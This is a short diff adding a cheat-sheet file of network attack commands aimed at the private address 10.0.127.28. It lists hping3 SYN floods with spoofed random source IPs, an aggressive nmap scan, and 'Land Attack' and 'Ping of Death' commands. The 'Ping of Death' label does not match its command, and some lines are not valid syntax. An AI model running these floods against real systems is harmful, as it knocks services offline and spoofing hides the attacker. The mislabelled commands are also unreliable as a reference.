@@ -1,0 +1,10 @@
+# Random source SYN Flood Attack, this makes each hit from the attack have a different IP
+Sudo hping3 --rand-source --flood -S -c 20000 Target IP (10.0.127.28)
+# Syn Flood Attack, just a brute force DOS
+Sudo hping3 --flood -S -c 20000 Target IP (10.0.127.28)
+# Port Scanning
+nmap -v -A -sV 10.0.127.28
+# Ping of Death
+hping3  -i u1  -S  -p 80 10.0.127.28
+# Land Attack
+hping3 -S -p 80 Target IP -a Target IP
